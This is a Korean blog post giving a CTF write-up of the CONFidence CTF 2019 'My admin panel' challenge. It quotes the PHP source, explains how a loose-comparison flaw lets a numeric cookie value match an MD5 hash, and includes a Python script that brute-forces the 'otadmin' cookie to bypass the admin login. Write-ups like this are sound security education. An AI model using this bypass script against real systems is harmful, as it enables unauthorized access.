---
layout: post
title: ! "[CONFidence CTF 2019] My admin panel"
categories: [CTF]
excerpt: " "
comments: true
share: true
tags:
  - Web-hacking
  - ctf
  - write-up
---

Teaser CONFidence CTF 2019의 `My admin panel` 문제이다.
[Link](https://gameserver.zajebistyc.tf/admin/)
![](/assets/posts/ctf/CONFidence/myadminpanel.png)

```php
<?php

include '../func.php';
include '../config.php';

if (!$_COOKIE['otadmin']) {
    exit("Not authenticated.\n");
}

if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
    exit();
}

$session_data = json_decode($_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

    exit("\n");
}

display_admin();

```

코드를 보면 otadmin 쿠키가 존재하지 않으면 "Not authenticated."가 뜬다.
디렉토리에서 바로 login.php 파일에 접근했을 때 뜨는 메시지와 동일하다.

otadmin 쿠키가 정규식 [0-9A-Z\"]와 일치하지 않거나 session_data가 NULL이면 "COOKIE TAMPERING xD IM A SECURITY EXPERT"가 뜬다.

![](/assets/posts/ctf/CONFidence/myadminpanel_burp.png)
![](/assets/posts/ctf/CONFidence/myadminpanel_hint.png)

hash 값과 strtoupper(MD5($cfg_pass))가 일치하지 않으면 위와 같이 힌트를 주는데
이 부분에서 loose comparison을 사용한다.
PHP는 loose comparision으로 정수와 문자열을 비교할 때 정수를 문자열의 첫 번째 숫자와 비교한다.
EX) 123 !== "123", 123 == "123aaa"

![](/assets/posts/ctf/CONFidence/loose_comparision.png)

`0006464640640064000646464640006400640640646400` 에서 앞부분 세 자리를 Bruteforce 하면 될 것 같다.


```py
import requests
  
url = "https://gameserver.zajebistyc.tf/admin/login.php"
s = requests.Session()

for i in range(500):
    r = s.get(url, cookies={'otadmin':'{"hash": '+str(i)+'}'})
    if "GIVE" not in r.text:
        print(r.text)
        print("HASH : "+str(i))
        break

```

![](/assets/posts/ctf/CONFidence/myadminpanel_flag.png)

플래그 !! 
